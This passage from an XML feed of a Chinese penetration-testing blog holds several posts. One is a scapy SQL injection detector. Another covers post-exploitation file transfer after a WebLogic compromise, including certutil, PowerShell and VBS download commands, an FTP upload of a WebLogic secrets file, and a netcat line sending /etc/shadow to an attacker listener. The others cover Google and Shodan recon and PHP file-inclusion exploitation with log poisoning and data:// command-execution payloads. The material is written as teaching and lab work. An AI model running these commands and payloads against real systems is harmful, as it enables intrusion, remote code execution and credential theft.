interface = &amp;apos;Realtek PCIe GBE Family Controller
      
    
    </summary>
    
      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>基于流量分析的SQL注入检测</title>
    <link href="http://yoursite.com/2018/12/03/%E5%9F%BA%E4%BA%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/"/>
    <id>http://yoursite.com/2018/12/03/基于流量分析的SQL注入检测/</id>
    <published>2018-12-03T07:50:08.000Z</published>
    <updated>2018-12-03T07:59:40.944Z</updated>
    
    <content type="html"><![CDATA[<pre><code>#encoding=utf-8from scapy.all import *import reimport datetime&apos;&apos;&apos;TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这种端点就叫做套接字（socket）或插口。每一个协议层都是Packet类的子类。协议层背后所有逻辑的操作都是被Packet类和继承的类所处理的。一个简单的协议层是由一系列的字段构成，他们关联在一起组成了协议层，解析时拆分成一个一个的字符串。这些字段都包含在名为fields_desc的属性中。&apos;&apos;&apos;def test(page):    &apos;&apos;&apos;    第一层是数据链路层，第二层是ip层，第三层是tcp层——&gt;包含端口号、http报文,第四层是应用层    其中每一层均为上一层的payload成员    &apos;&apos;&apos;    for f in page.payload.payload.payload.fields_desc:        # f.name为Raw的字段名称——&gt;load：传输的http请求信息        fvalue = page.payload.payload.getfieldval(f.name)        reprval = f.i2repr(page.payload.payload, fvalue)  # 转换成十进制字符串        if &apos;HTTP&apos; in reprval:            lst = str(reprval).split(r&apos;\r\n&apos;)            la = re.findall(&apos;(GET )|(POST )&apos;, lst[0])            if la != []:                if la[0][0] == &apos;&apos;:                    with open(&apos;sql.txt&apos;, &apos;r+&apos;) as file:                        for fi in file.readlines():                            if fi.strip(&apos;\n&apos;) in str(lst[-1]).lower():                                try:                                    i = datetime.datetime.now()                                    print(&quot;[!]您正在被攻击！&quot;)                                    print(&apos;[*]攻击时间是\t&apos;+str(i))                                    beiattack = re.findall(&apos;Host: \w{3}\.\w{3}\.\w{3}\.\w{3}&apos;, str(lst))                                    print(&apos;[*]被SQL注入攻击的IP为\t&apos; + beiattack[0].strip(&quot;Host: &quot;))                                    print(&apos;[*]攻击的payload是\t&apos; + lst[-1].strip(&apos;\&apos;&apos;))                                    print(&apos;[*]提交的方式为\tPOST&apos;)                                    with open(&apos;danger.log&apos;, &apos;a+&apos;) as f:                                        f.write(                                            &quot;[!]您正在被攻击！\n [*]攻击时间是\t%s\n[*]被SQL注入攻击的IP为\t%s\n[*]攻击的payload是\t%s\n[*]提交的方式为\t POST\n\n&quot; % (                                            str(i),beiattack[0], lst[-1]))                                except:                                    pass                if la[0][1] == &apos;&apos;:                    with open(&apos;sql.txt&apos;, &apos;r+&apos;) as file:                        for fi in file.readlines():                            if fi.strip(&apos;\n&apos;) in str(lst[0]).lower():                                try:                                    i = datetime.datetime.now()                                    print(&quot;[!]您正在被攻击！&quot;)                                    beiattack = re.findall(&apos;Host: \w{3}\.\w{3}\.\w{3}\.\w{3}&apos;, str(lst))                                    print(&apos;[*]攻击时间是\t&apos;+str(i))                                    print(&apos;[*]被SQL注入攻击的IP为\t&apos; + beiattack[0].strip(&quot;Host: &quot;))                                    print(&apos;[*]攻击的payload是\t&apos;+ lst[0].strip(&apos;\&apos;GET &apos;))                                    print(&apos;[*]提交的方式为\tGET&apos;)                                    with open(&apos;danger.log&apos;, &apos;a+&apos;) as f:                                        f.write(                                            &quot;[!]您正在被攻击！\n[*]攻击时间是\t%s\n [*]被SQL注入攻击的IP为\t%s\n[*]攻击的payload是\t%s\n[*]提交的方式为\t GET\n\n&quot; % (                                                str(i),beiattack[0], lst[0]))                                except:                                    passdef main():    #无限抓取通过VMware Virtual Ethernet Adapter for VMnet8网卡的80端口的数据包并传给回调函数test    a = sniff(filter=&apos;host 192.168.209.137&apos;, iface=&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;, prn=test, count=0)if __name__ == &apos;__main__&apos;:    main()</code></pre><p>sql.txt：提供特殊字段检测的字典。    </p><p>Danger.log：如果有SQL注入攻击，则保存攻击时间、被攻击的IP、攻击的payload和提交的方式。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtlzg7mi9j30t308a74w.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;#encoding=utf-8
from scapy.all import *
import re
import datetime
&amp;apos;&amp;apos;&amp;apos;
TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这种端点就叫做套接字（so
      
    
    </summary>
    
      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>内网文件传输</title>
    <link href="http://yoursite.com/2018/12/03/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"/>
    <id>http://yoursite.com/2018/12/03/内网文件传输/</id>
    <published>2018-12-03T06:57:38.000Z</published>
    <updated>2018-12-03T11:55:45.471Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件传输方法："><a href="#文件传输方法：" class="headerlink" title="文件传输方法："></a>文件传输方法：</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>ftp -s:1.txt【-s将后面跟的1.txt内容全部当做命令行执行】（FTP传文件比较万能，任意类型文件都可上传）</p><h4 id="实践："><a href="#实践：" class="headerlink" title="实践："></a>实践：</h4><p>现有公网IP: 101.198.183.60，内网IP: 192.168.0.84的开发webloginc 7001端口并且有反序列化漏洞的主机一台，以及</p><p>公网IP: 101.198.183.68，内网IP: 192.168.0.98开放ftp服务的主机一台。</p><p>实施攻击的是不同网段的win7攻击机（可以访问公网，但是内网不可访问）。</p><p>开启FTP服务：<br><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtss5qpy1j30c208tdg0.jpg" alt=""></p><p>使用win7攻击机上的WebLogicExploit工具远程连接weblogic主机</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtst1385ij30in0c474q.jpg" alt=""></p><pre><code>1、echo open 192.168.0.98 2121 &gt;&gt; 1.txt         //登陆FTP服务器2、echo guoxiang&gt;&gt;1.txt                              //用户名3、echo password&gt;&gt;1.txt                              //密码4、echo bin&gt;&gt;1.txt                              //开始5、echo put C:\Oracle\Middleware\user_projects\domains\college\security\SerializedSystemIni.dat&gt;&gt; 1.txt                      //下载程序6、echo bye&gt;&gt;1.txt                              //关闭FTP服务器</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtstvlpcgj30hi08owex.jpg" alt=""></p><p>然后执行ftp -s:1.txt</p><p>发现在ftp主机中出现了上传的文件。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsufxctmj30jw0800tc.jpg" alt=""></p><p>用同一内网下含有反序列化任意命令执行漏洞的weblogic主机做跳板，用weblogic主机去攻击同一内网下的ftp主机。</p><h3 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h3><p>echo 下载文件程序&gt;&gt;loader.vbs cscript loader.vbs远程文件位置保存文件位置</p><pre><code>echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; loader.vbscscript loader.vbs http://192.168.0.98:7001/test/putty.exe C:\Users\linghuchong\Desktop\Tools\putty.exeputty.exe</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsvspt2zj30np0czdhb.jpg" alt=""></p><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p><code>powershell-exec bypass-c（new-object System.Net.WebClient）.DownloadFile（“远程文件位置“保存文件位置）</code></p><pre><code> powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&apos;http://192.168.111.1:8080/test/putty.exe&apos;,&apos;C:\Users\linghuchong\Desktop\Tools\putty1.exe&apos;)putty1.exe</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsxb16y4j30ko0cywfm.jpg" alt=""></p><h3 id="certain"><a href="#certain" class="headerlink" title="certain"></a>certain</h3><p><code>certutil.exe -urlcache -split -f 远程文件位置</code></p><pre><code>certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.execertutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe delete        //删除缓存putty.exe</code></pre><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>攻击端监听端口，并重定向：</p><pre><code>nc -nvv -lp 4455 &gt; shaodw.txt</code></pre><p>目标机将文件内容回传：</p><pre><code>nc 192.168.111.251 4455 &lt; /etc/shadow</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsylae6dj30qc0egwfl.jpg" alt=""></p><h3 id="Wget（下载）"><a href="#Wget（下载）" class="headerlink" title="Wget（下载）"></a>Wget（下载）</h3><pre><code>wget http://192.168.111.1:8080/test/putty.exe</code></pre><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。</p><pre><code>curl -O http://192.168.111.1:8080/test/putty.exe</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件传输方法：&quot;&gt;&lt;a href=&quot;#文件传输方法：&quot; class=&quot;headerlink&quot; title=&quot;文件传输方法：&quot;&gt;&lt;/a&gt;文件传输方法：&lt;/h1&gt;&lt;h2 id=&quot;windows&quot;&gt;&lt;a href=&quot;#windows&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="内网渗透" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>搜索引擎——永不过时的渗透神器</title>
    <link href="http://yoursite.com/2018/12/03/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E2%80%94%E2%80%94%E6%B0%B8%E4%B8%8D%E8%BF%87%E6%97%B6%E7%9A%84%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/"/>
    <id>http://yoursite.com/2018/12/03/搜索引擎——永不过时的渗透神器/</id>
    <published>2018-12-03T02:38:33.000Z</published>
    <updated>2018-12-03T06:28:22.533Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h1><p>使用Google搜索引擎或其他Google应用程序通过特定语法来查找网站配置或代码中的安全漏洞<br>搜索登录后台、特定文件、漏洞贡面、错误信息等等</p><h2 id="逻辑运算符："><a href="#逻辑运算符：" class="headerlink" title="逻辑运算符："></a>逻辑运算符：</h2><ul><li><code>+</code>强制搜索其后的一个单词</li><li><code>-</code>把某个字忽略</li><li><code>~</code> 同意词博客设置</li><li><code>.</code>单一的通配符</li><li><code>*</code> 通配符，可代表多个字母</li><li><code>“”</code> 精确查询</li><li><code>I</code> 或 <code>OR</code> 只要符合多个关键字中的任意一个的结果予以显示</li></ul><h2 id="基本语法："><a href="#基本语法：" class="headerlink" title="基本语法："></a>基本语法：</h2><p><strong>intext:key</strong></p><ul><li>搜索网页带有关键字的页面</li></ul><p><strong>allintext:key</strong></p><ul><li>功能与intext，但是可以接多个关键字</li></ul><p><strong>intitle:key</strong></p><ul><li>搜索网页标题中是否有所输入的文字</li></ul><p><strong>allintitle:key</strong></p><ul><li>功能与intext，可以接多个关键字，但不能与别的关键字连用</li></ul><p><strong>Index of/(例如：index of/login)</strong></p><ul><li>使用它可以直接进入网站首页下的所有文件和文件夹中。（可以查看有没有目录遍历漏洞）</li></ul><p><img src="https://i.imgur.com/BhnmcG7.png" alt=""></p><p><strong>cache:url</strong></p><ul><li>查看指定URL快照</li></ul><p><strong>filetype：</strong></p><ul><li>搜索指定类型文件</li></ul><p><strong>info：</strong></p><ul><li>搜索输入URL的摘要信息和其他相关信息，不能与其他关键词混用</li></ul><p><strong>inurl：</strong></p><ul><li>搜索输入字符是否存在于URL中，可以与site结合找后台</li></ul><p><strong>site：</strong></p><ul><li>搜索特定网站或者子域名</li></ul><p><strong>related:URL</strong></p><ul><li>搜索与该URL相关的页面</li></ul><p><strong>Link：</strong></p><ul><li>link:thief.one可以返回所有和thief.one做了链接的URL。</li></ul><h3 id="搜索不同地域网站"><a href="#搜索不同地域网站" class="headerlink" title="搜索不同地域网站"></a>搜索不同地域网站</h3><ul><li>inurl:tw 台湾</li><li>inurl:jp 日本</li></ul><h3 id="Google-hacking语法数据库"><a href="#Google-hacking语法数据库" class="headerlink" title="Google hacking语法数据库"></a>Google hacking语法数据库</h3><p><a href="https://www.exploit-db.com/google-hacking-database/" title="google hacking database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a></p><h3 id="利用Google搜索C段服务器信息"><a href="#利用Google搜索C段服务器信息" class="headerlink" title="利用Google搜索C段服务器信息"></a>利用Google搜索C段服务器信息</h3><pre><code>site:218.87.21.* </code></pre><p>通过google可获取218.87.21.0/24网络的服务信息。</p><h1 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h1><p>网络空间搜索引擎不同于搜索普通网页，而是直接搜索网络中<strong>存在主机</strong>，将主机信息汇聚成数据库，然后显示出主机的<strong>IP</strong>、<strong>端口</strong>、<strong>中间件</strong>、<strong>摄像头</strong>，<strong>工控设备banner</strong>、等<strong>其他网络设备信息</strong>。</p><blockquote><p>同时可以按照普通搜索引擎规则来搜索网络设备：<code>ip:&quot;192.168.1.0&quot;</code>。</p></blockquote><p><img src="https://i.imgur.com/Ni01wwX.png" alt=""></p><h2 id="常见的搜索引擎："><a href="#常见的搜索引擎：" class="headerlink" title="常见的搜索引擎："></a>常见的搜索引擎：</h2><p>用法大多相同，这里只写shodan的用法。其他类比。</p><h3 id="国内："><a href="#国内：" class="headerlink" title="国内："></a>国内：</h3><ul><li>zoomeye：（<a href="https://www.zoomeye.org/）" target="_blank" rel="noopener">https://www.zoomeye.org/）</a></li><li>fofa</li></ul><h3 id="国外："><a href="#国外：" class="headerlink" title="国外："></a>国外：</h3><ul><li>shodan（俗称黑暗谷歌）</li></ul><h3 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h3><p><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></p><blockquote><p>shoadn一刻不停的寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。</p></blockquote><blockquote><p>凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到</p></blockquote><p><strong>shodan可以在windows下网页中运行，也可以在linux下安装运行。</strong></p><h4 id="基本语法：-1"><a href="#基本语法：-1" class="headerlink" title="基本语法："></a>基本语法：</h4><ul><li>hostname：　　搜索指定的主机或域名，例如 <code>hostname:”google”</code></li><li>port：　　搜索指定的端口或服务，例如 <code>port:”21”</code></li><li>country：　　搜索指定的国家，例如 <code>country:”CN”</code></li><li>city：　　搜索指定的城市，例如 <code>city:”Hefei”</code></li><li>org：　　搜索指定的组织或公司，例如 <code>org:”google”</code></li><li>isp：　　搜索指定的ISP供应商，例如 <code>isp:”China Telecom”</code></li><li>product：　　搜索指定的操作系统/软件/平台，例如 <code>product:”Apache httpd”</code></li><li>version：　　搜索指定的软件版本，例如 <code>version:”1.6.2”</code></li><li>geo：　　搜索指定的地理位置，例如 <code>vgeo:”31.8639, 117.2808”</code></li><li>before/after：　　搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 <code>before:”11-11-15”v</code></li><li>net：　　搜索指定的IP地址或子网，例如 <code>net:”210.45.240.0/24”</code></li></ul><h4 id="http-favicon-hash方法可以来搜索使用同一icon图标的网站。"><a href="#http-favicon-hash方法可以来搜索使用同一icon图标的网站。" class="headerlink" title="http.favicon.hash方法可以来搜索使用同一icon图标的网站。"></a>http.favicon.hash方法可以来搜索使用同一icon图标的网站。</h4><p>如果我想搜索带有这个icon的所有ip地址的话，可以先在Shodan搜索这个ip，这里要用到一个之前没注意到的东西，就是Shodan的原始数据（Raw Data）功能，</p><p><img src="https://i.imgur.com/qhV0I7E.png" alt=""></p><p>这里面有很多原始数据。</p><p>从中找到相应：<code>data.0.http.favicon.hash</code>字段</p><p><img src="https://i.imgur.com/WveNDBo.png" alt=""></p><p><strong>通过命令：</strong></p><pre><code>http.favicon.hash:600245583</code></pre><p><img src="https://i.imgur.com/439Ia6d.png" alt=""></p><p><strong>命令：</strong></p><pre><code>net:&quot;114.242.146.0/24&quot;</code></pre><p><img src="https://i.imgur.com/Fvu0fFx.png" alt=""></p><p><strong>命令：</strong></p><pre><code>os:&quot;windows 7&quot; country:&quot;CN&quot; city:&quot;beijing&quot;</code></pre><p><img src="https://i.imgur.com/sE9g4BZ.png" alt=""></p><p><strong>不仅可以运用标准操作。还可以直接搜索功能</strong></p><p><img src="https://i.imgur.com/cXumk4F.png" alt=""></p><h4 id="在linux下得先对shodan进行安装"><a href="#在linux下得先对shodan进行安装" class="headerlink" title="在linux下得先对shodan进行安装"></a>在linux下得先对shodan进行安装</h4><pre><code>pip install shodan</code></pre><p>然后初始化shodan</p><pre><code>shodan init ‘key’</code></pre><p>这里的key是注册shodan账号时候给你的</p><p><img src="https://i.imgur.com/HRsjXrs.png" alt=""></p><p>count：统计结果</p><p><img src="https://i.imgur.com/488XdkT.png" alt=""></p><p>download：下载数据，数据格式<code>json</code></p><p><img src="https://i.imgur.com/quNuDA5.png" alt=""></p><pre><code>shodan parse --fields ip_str,port waiwang.json </code></pre><blockquote><p>parse：解析json数据。 而且只取ip_str和port字段的值</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2018111320462670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>shodan parse --fields ip_str,port waiwang.json |grep 80</code></pre><p><img src="https://img-blog.csdnimg.cn/20181113204721260.png" alt=""></p><pre><code>shodan host 114.242.146.192</code></pre><blockquote><p>host：搜索指定IP</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20181113205139894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>shodan myip</code></pre><p><img src="https://img-blog.csdnimg.cn/20181113205225164.png" alt=""></p><pre><code>shodan search --fields ip_str,port net:&apos;114.242.146.0/24&apos;</code></pre><blockquote><p>search：搜索内容</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20181113205402388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Google-Hacking&quot;&gt;&lt;a href=&quot;#Google-Hacking&quot; class=&quot;headerlink&quot; title=&quot;Google Hacking&quot;&gt;&lt;/a&gt;Google Hacking&lt;/h1&gt;&lt;p&gt;使用Google搜索引擎或其他Google应
      
    
    </summary>
    
      <category term="Google Hacking" scheme="http://yoursite.com/categories/Google-Hacking/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="http://yoursite.com/2018/12/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>http://yoursite.com/2018/12/02/内网渗透/</id>
    <published>2018-12-02T12:29:02.000Z</published>
    <updated>2018-12-03T06:47:06.767Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="内网渗透" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>文件包含漏洞详解</title>
    <link href="http://yoursite.com/2018/12/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/12/02/文件包含漏洞详解/</id>
    <published>2018-12-02T08:01:44.000Z</published>
    <updated>2018-12-02T10:56:35.202Z</updated>
    
    <content type="html"><![CDATA[<p>严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。</p><p><strong>常见的导致文件包含（文件读取）的函数如下：</strong></p><p><strong>PHP：</strong></p><p><strong>include()</strong>：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p><p><img src="https://i.imgur.com/aLJdj9E.png" alt=""></p><p><strong>require()</strong>：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</p><p><img src="https://i.imgur.com/tvkgeYA.png" alt=""></p><p><code>require_once()</code> 和 <code>include_once()</code> 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 <code>require_once()</code> 和<code>include_once()</code> 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p><blockquote><p><strong>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</strong></p></blockquote><p>接下来的测试会用下面这个非常简单的代码进行：</p><pre><code>&lt;?php    $file = $_GET[&apos;file&apos;];    include $file;?&gt;</code></pre><p>同目录下有一个phpinfo.txt文件（内容为&lt;?php phpinfo();?&gt;）</p><p><img src="https://i.imgur.com/25CI6aq.png" alt=""></p><h3 id="文件包含有两种："><a href="#文件包含有两种：" class="headerlink" title="文件包含有两种："></a>文件包含有两种：</h3><p>本地文件包含、远程文件包含 （即加载远程文件，在php.ini中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。开启后可以直接执行任意代码。）</p><h3 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞。</p><ul><li>具有相关的文件包含函数。</li><li>文件包含函数中存在动态变量，比如 include $file;。</li><li>攻击者能够控制该变量，比如$file = $_GET[‘file’];。</li></ul><h2 id="php的文件包含利用"><a href="#php的文件包含利用" class="headerlink" title="php的文件包含利用"></a>php的文件包含利用</h2><p><strong>在php.ini中，<code>allow_url_fopen</code>默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。</strong></p><h3 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h3><p>访问：<code>http://www.test.com/index.php?test=/etc/passwd</code>,如果目标主机存在该文件，并且具有读权限，那么就可以读出文件内容。</p><h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><ol><li><code>allow_url_fopen</code> = On</li><li><code>allow_url_include</code> = On</li></ol><p>在远程文件<code>http://10.60.17.60</code>里写入测试代码。</p><pre><code>&lt;?php fputs(fopen(&quot;text.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;) ?&gt;</code></pre><p>  访问<code>http://127.0.0.1/123.php?file=http://10.60.17.46/phpinfo.php</code>。将会在网站根目录下生成text.php文件，内容就是：”<code>&lt;?php phpinfo(); ?&gt;</code>“</p><p><img src="https://i.imgur.com/wgq7QtT.png" alt=""></p><h3 id="图片上传并包含图片shell"><a href="#图片上传并包含图片shell" class="headerlink" title="图片上传并包含图片shell"></a>图片上传并包含图片shell</h3><p>利用方法和上面的一样，只是这次是本地包含，直接在上传的图片中写入测试代码并访问图片地址即可。</p><h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><p><strong>利用条件：</strong>需要知道ssh-log的位置，且可读。默认情况下为 <code>/var/log/auth.log</code></p><pre><code>ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost</code></pre><p>之后会提示输入密码等等，随便输入。</p><p>然后在remotehost的ssh-log中即可写入php代码：</p><p><img src="https://i.imgur.com/CSUgdBp.png" alt=""></p><p>之后进行文件包含即可。</p><h3 id="包含日志文件GetShell"><a href="#包含日志文件GetShell" class="headerlink" title="包含日志文件GetShell"></a>包含日志文件GetShell</h3><p><strong>利用条件：</strong>需要知道服务器日志的存储路径，且日志文件可读。</p><p>既然存在文件包含漏洞就可以利用漏洞读取apache的配置文件找到日志文件的位置。（默认：包含日志文件GetShell）</p><p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 <code>/var/log/apache2/</code>。</p><p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改.</p><p><img src="https://i.imgur.com/TP2yw0G.png" alt=""></p><p>正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。</p><p><img src="https://i.imgur.com/HCmTOhJ.png" alt=""></p><p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p><h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p><strong>利用条件：</strong> php版本 &lt; php 5.2.8</p><p>目录字符串，在linux下<strong>4096字节</strong>时会达到最大值，在window下是<strong>256字节</strong>。只要不断的重复<code>./</code></p><pre><code>index.php?file=././././省略././shell.txt</code></pre><h3 id="0字节截断包含"><a href="#0字节截断包含" class="headerlink" title="0字节截断包含"></a>0字节截断包含</h3><p><strong>利用条件：</strong> php版本 &lt; php 5.3.4</p><p>测试代码：</p><pre><code>&lt;?php    $file = $_GET[&apos;file&apos;];    include $file.&apos;/tasdas/asd.php&apos;;?&gt;http://127.0.0.1/123.php?file=phpinfo.txt%00</code></pre><p><img src="https://i.imgur.com/MkYTX3b.png" alt=""></p><blockquote><p>正常上传图片一句话并访问：<code>http://test.com/index.php?test=1.jpg</code>会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入<code>http://test.com/index.php?test=1.jpg%00</code>，就极有可能会绕过检测。这种方法只适用于php.ini中<code>magic_quotes_qpc=off</code>并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。</p></blockquote><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>PHP伪协议其实就是PHP支持的协议和封装的协议，</p><ul><li>file: — 访问本地文件系统</li><li>http: — 访问 HTTP(s) 网址</li><li>ftp: — 访问 FTP(s) URLs</li><li>php: — 访问各个输入/输出流（I/O streams）【php://stdin 是只读的， php://stdout 和 php://stderr 是只写的】</li><li>zlib: — 压缩流</li><li>data: — 数据（RFC 2397）</li><li>glob: — 查找匹配的文件路径模式</li><li>phar: — PHP 归档</li><li>ssh2: — Secure Shell 2</li><li>rar: — RAR</li><li>ogg: — 音频流</li><li>expect: — 处理交互式的流</li></ul><p>有两个比较重要的配置在php.ini中，<code>allow_url_fopen</code> 和<code>allow_url_include</code>会影响到fopen和include等等函数对于伪协议的支持，而<code>allow_url_include</code>依赖<code>allow_url_fopen</code>，所以<code>allow_url_fopen</code>不开启的话，<code>allow_url_include</code>也是无法使用的。</p><h4 id="File"><a href="#File" class="headerlink" title="File://"></a>File://</h4><p>用于访问文件系统。（可用于任意文件执行），在<code>allow_url_fopen</code> 和<code>allow_url_include</code>任何状态下都可以用。</p><h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><ul><li>php版本大于等于php5.2</li><li><code>allow_url_fopen</code> = On</li><li><code>allow_url_include</code> = On</li></ul><pre><code>http://127.0.0.1/123.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre><p>任意命令执行</p><pre><code>http://127.0.0.1/123.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;</code></pre><p>利用base64编码绕过</p><pre><code>http://127.0.0.1/123.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><blockquote><p>加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：<code>&lt;?php phpinfo();?&gt;</code></p></blockquote><p><img src="https://i.imgur.com/en29m6p.png" alt=""></p><p><img src="https://i.imgur.com/DNV6gBY.png" alt=""></p><h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>php版本大于等于php5.3.0</p><p>在网站根目录下有一个phpinfo.txt内容为&lt;?php phpinfo();?&gt;，打包成压缩包。</p><p>使用绝对路径：</p><pre><code>http://127.0.0.1/123.php?file=phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre><p><img src="https://i.imgur.com/is1PJIk.png" alt=""></p><p>或者使用相对路径：</p><pre><code>http://127.0.0.1/123.php?file=phar://phpinfo.zip/phpinfo.txt</code></pre><p><img src="https://i.imgur.com/w5hVkH8.png" alt=""></p><h4 id="zip-–-zlib-–bzip2-–zip"><a href="#zip-–-zlib-–bzip2-–zip" class="headerlink" title="zip:// – zlib:// –bzip2:// –zip://"></a>zip:// – zlib:// –bzip2:// 